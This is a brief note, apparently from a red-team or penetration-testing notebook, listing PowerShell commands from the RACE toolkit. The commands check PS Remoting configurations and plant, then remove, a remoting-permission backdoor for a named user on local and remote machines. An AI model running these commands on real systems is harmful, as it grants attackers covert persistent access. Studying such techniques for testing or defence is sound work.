Using the RACE toolkit PS Remoting Backdoor not stable after August 2020 Patches
ACL PS Remoting check with powershell
`PS > winrm quickconfig
`PS > Get-PSSessionConfiguration
`PS > Get-PSSessionConfiguration -Name microsoft.powershell
`PS > set-PSSessionConfiguration -Name microsoft.powershell -ShowSecurityDescriptorUI

on local machine for Nuser
`PS > Set-RemotePSRemoting -SamAccountName Nuser -ComputerName Mal-analysis -verbose
on remote machine for Nuser without credentials
`PS > set-RemotePSRemoting -SamAccountName Nuser -ComputerName mal-analysis -verbose
On Remote Machine, remove the Permissions
`PS > set-RemotePSRemoting -SamAccountName Nuser -ComputerName x.x.x.x  -Remove -Verbose

resource : https://github.com/samratashok/RACE 